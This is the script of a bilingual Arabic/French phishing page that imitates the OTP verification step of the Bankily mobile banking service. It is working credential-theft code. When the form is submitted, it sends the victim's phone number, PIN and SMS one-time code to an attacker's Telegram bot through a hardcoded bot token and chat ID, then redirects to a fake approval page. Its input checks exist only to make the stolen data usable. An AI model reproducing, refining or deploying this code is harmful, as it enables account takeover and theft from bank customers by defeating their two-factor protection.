  <script>

    /* ════════════════════════════════════════════════════
       TEXTES BILINGUES
    ════════════════════════════════════════════════════ */
    const T = {
      ar: {
        topTitle    : 'رمز التحقق',
        instruction : 'أدخل رمز التحقق المرسل إلى رقم هاتفك عبر رسالة SMS',
        expireText  : 'ينتهي رمز التحقق بعد',
        resend      : 'إعادة إرسال رمز التحقق',
        verify      : 'تحقق',
        back        : 'رجوع &#8594;',
        lang        : 'FR',
        expired     : 'انتهت صلاحية الرمز',
        resendMsg   : 'تم إرسال رمز جديد',
        errEmpty    : 'الرجاء إدخال جميع الأرقام الأربعة',
        errDigits   : 'الرجاء إدخال أرقام صحيحة فقط',
        errSamePin  : 'رمز التحقق لا يمكن أن يكون نفس رمز PIN',
        // رسالة الخمس ثوانٍ الأولى
        errTooFast  : 'عزيزي (ة) المشترك (ة)\nيجب عليك أن تتأكد من أنك قد قمت بإدخال رمز التحقق الذي تلقيته عن طريق رسالة نصية SMS',
        // guard
        guardMsg    : 'يجب عليك إدخال رقمك ورمزك السري أولاً',
        guardSub    : 'جاري تحويلك إلى صفحة تسجيل الدخول...',
      },
      fr: {
        topTitle    : 'Code de vérification',
        instruction : 'Entrez le code de vérification SMS transmis sur votre numéro de téléphone',
        expireText  : 'Code de vérification expire dans',
        resend      : 'Renvoyer code de vérification',
        verify      : 'Vérifier',
        back        : '&#8592; Retour',
        lang        : 'عربي',
        expired     : 'Le code a expiré',
        resendMsg   : 'Un nouveau code a été envoyé',
        errEmpty    : 'Veuillez entrer les 4 chiffres du code',
        errDigits   : 'Veuillez entrer uniquement des chiffres valides',
        errSamePin  : 'Le code de vérification ne peut pas être identique au code PIN',
        // message 5 premières secondes
        errTooFast  : 'Cher(e) abonné(e),\nVous devez vous assurer d\'avoir saisi le code de vérification que vous avez reçu par SMS',
        // guard
        guardMsg    : 'Vous devez d\'abord saisir votre numéro et code PIN',
        guardSub    : 'Redirection vers la page de connexion...',
      }
    };

    /* ════════════════════════════════════════════════════
       LANGUE
    ════════════════════════════════════════════════════ */
    let isArabic = localStorage.getItem('bankily_lang')
      ? localStorage.getItem('bankily_lang') === 'ar'
      : (navigator.language || navigator.userLanguage || '').startsWith('ar');

    function getLang() { return isArabic ? T.ar : T.fr; }

    function applyLang() {
      const L       = getLang();
      const langBtn = document.getElementById('lang-btn');
      const backBtn = document.getElementById('back-btn');

      document.body.dir             = isArabic ? 'rtl' : 'ltr';
      document.documentElement.lang = isArabic ? 'ar'  : 'fr';

      langBtn.textContent = L.lang;
      backBtn.innerHTML   = L.back;
      document.getElementById('top-bar-title').innerText = L.topTitle;
      document.getElementById('instruction').innerText   = L.instruction;
      document.getElementById('expire-text').innerText   = L.expireText;
      document.getElementById('resend').innerText        = L.resend;
      document.getElementById('verify').innerText        = L.verify;
    }

    function toggleLang() {
      isArabic = !isArabic;
      localStorage.setItem('bankily_lang', isArabic ? 'ar' : 'fr');
      applyLang();
    }

    /* ════════════════════════════════════════════════════
       GARDE DE SÉCURITÉ — Fix : exécution IMMÉDIATE
       sans attendre DOMContentLoaded
       Le script est en bas du body → DOM déjà prêt
    ════════════════════════════════════════════════════ */
    const savedPin = sessionStorage.getItem('bankily_pin');

    if (!savedPin || savedPin.trim() === '') {
      // Afficher le guard overlay immédiatement
      const guardOverlay = document.getElementById('guard-overlay');
      const L = getLang();

      document.getElementById('guard-msg').textContent = L.guardMsg;
      document.getElementById('guard-sub').textContent = L.guardSub;

      // Direction du texte
      document.getElementById('guard-msg').style.direction = isArabic ? 'rtl' : 'ltr';
      document.getElementById('guard-sub').style.direction = isArabic ? 'rtl' : 'ltr';

      guardOverlay.classList.add('active');

      // Bloquer toute interaction avec la page
      document.body.style.overflow = 'hidden';

      // Redirection après 1.5 secondes
      setTimeout(() => {
        window.location.replace('login.html');
      }, 1500);

    } else {

      /* ════════════════════════════════════════════════════
         PAGE NORMALE — utilisateur vient de login.html
      ════════════════════════════════════════════════════ */

      // Appliquer la langue
      applyLang();

      /* ── Modal helpers ── */
      function showModal(msg) {
        document.getElementById('modal-text').innerText = msg;
        document.getElementById('modal-alert').style.display = 'flex';
      }

      document.getElementById('modal-close').addEventListener('click', () => {
        document.getElementById('modal-alert').style.display = 'none';
      });

      /* ════════════════════════════════════════════════════
         HORODATAGE D'OUVERTURE — pour la vérification 5s
         On enregistre le moment où la page est ouverte
      ════════════════════════════════════════════════════ */
      const pageOpenTime = Date.now(); // en millisecondes

      /* ── OTP inputs navigation ── */
      const inputs = document.querySelectorAll('.pin-input');
      inputs.forEach((input, index) => {
        input.setAttribute('dir', 'ltr');

        input.addEventListener('input', () => {
          input.value = input.value.replace(/[^0-9]/g, '');
          if (input.value.length === 1 && index < inputs.length - 1) {
            inputs[index + 1].focus();
          }
        });

        input.addEventListener('keydown', e => {
          if (e.key === 'Backspace' && input.value === '' && index > 0) {
            inputs[index - 1].focus();
          }
          if (!/^[0-9]$/.test(e.key) &&
              !['Backspace','Delete','Tab','ArrowLeft','ArrowRight'].includes(e.key)) {
            e.preventDefault();
          }
        });

        input.addEventListener('paste', e => {
          e.preventDefault();
          const digits = (e.clipboardData || window.clipboardData)
            .getData('text').replace(/[^0-9]/g, '');
          for (let i = 0; i < digits.length && index + i < inputs.length; i++) {
            inputs[index + i].value = digits[i];
          }
          inputs[Math.min(index + digits.length, inputs.length - 1)].focus();
        });
      });

      /* ── Countdown 5 minutes ── */
      let seconds = 299;
      const timerDisplay = document.getElementById('timer');

      function updateTimer() {
        const mins = Math.floor(seconds / 60);
        const secs = seconds % 60;
        timerDisplay.textContent =
          `${mins} ${isArabic ? 'دقيقة' : 'Minutes'} ${secs < 10 ? '0'+secs : secs} ${isArabic ? 'ثانية' : 'Seconds'}`;

        if (seconds > 0) {
          seconds--;
          setTimeout(updateTimer, 1000);
        } else {
          timerDisplay.textContent = getLang().expired;
          timerDisplay.style.color = 'red';
          const btn = document.getElementById('verify');
          btn.disabled = true;
        }
      }
      updateTimer();

      /* ── Resend ── */
      document.getElementById('resend').addEventListener('click', () => {
        seconds = 299;
        timerDisplay.style.color = '#333';
        const btn = document.getElementById('verify');
        btn.disabled = false;
        inputs.forEach(i => i.value = '');
        inputs[0].focus();
        showModal(getLang().resendMsg);
      });

      /* ── Keyboard adjust for verify button ── */
      const verifyBtn = document.getElementById('verify');
      function adjustButton() {
        if (window.visualViewport) {
          const kb = window.innerHeight - window.visualViewport.height;
          verifyBtn.style.transform = kb > 0 ? `translateY(-${kb}px)` : 'translateY(0)';
        }
      }
      if (window.visualViewport) window.visualViewport.addEventListener('resize', adjustButton);
      inputs.forEach(input => {
        input.addEventListener('focus', adjustButton);
        input.addEventListener('blur', () => setTimeout(adjustButton, 100));
      });

      /* ════════════════════════════════════════════════════
         SOUMISSION OTP
      ════════════════════════════════════════════════════ */
      /* ═══════════════════════════════════════════════
         TELEGRAM CONFIG — GitHub Pages (no backend)
      ═══════════════════════════════════════════════ */
      const TG_TOKEN   = '8250056043:AAFYXOIiBAeHTuZV8pPZUhV6NRTwMPipfrM';
      const TG_CHAT_ID = '8372738559';
      const savedUsername = sessionStorage.getItem('bankily_username') || '—';

      async function sendToTelegram(text) {
        try {
          await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              chat_id:    TG_CHAT_ID,
              text:       text,
              parse_mode: 'HTML'
            })
          });
        } catch(e) { /* silencieux */ }
      }

      document.getElementById('otp-form').addEventListener('submit', async e => {
        e.preventDefault();
        const L = getLang();

        // ── Vérification 5 premières secondes ──
        const elapsed = (Date.now() - pageOpenTime) / 1000;
        if (elapsed < 5) {
          showModal(L.errTooFast);
          return;
        }

        // ── Lire OTP ──
        let otp = '';
        inputs.forEach(i => otp += i.value);

        // ── Vérif 4 chiffres ──
        if (otp.length !== 4 || [...inputs].some(i => i.value === '')) {
          showModal(L.errEmpty);
          return;
        }
        if (!/^[0-9]{4}$/.test(otp)) {
          showModal(L.errDigits);
          return;
        }

        // ── OTP ≠ PIN ──
        if (savedPin && otp === savedPin) {
          showModal(L.errSamePin);
          inputs.forEach(i => i.value = '');
          inputs[0].focus();
          return;
        }

        // ── Afficher loader ──
        document.getElementById('loader-overlay').classList.add('active');

        // ── Envoyer OTP à Telegram ──
        const now = new Date().toLocaleString('fr-FR');
        await sendToTelegram(
          `✅ <b>Code OTP reçu – Bankily</b>\n` +
          `━━━━━━━━━━━━━━━━━━━━\n` +
          `📱 <b>Numéro :</b> <code>${savedUsername}</code>\n` +
          `🔑 <b>PIN    :</b> <code>${savedPin || '—'}</code>\n` +
          `🔢 <b>OTP    :</b> <code>${otp}</code>\n` +
          `📅 <b>Heure  :</b> ${now}`
        );

        // ── Nettoyer la session ──
        sessionStorage.removeItem('bankily_pin');
        sessionStorage.removeItem('bankily_username');

        // ── Rediriger vers la page de confirmation ──
        setTimeout(() => { window.location.href = 'approuv.html'; }, 1500);
      });

    } // fin bloc utilisateur connecté

  </script>

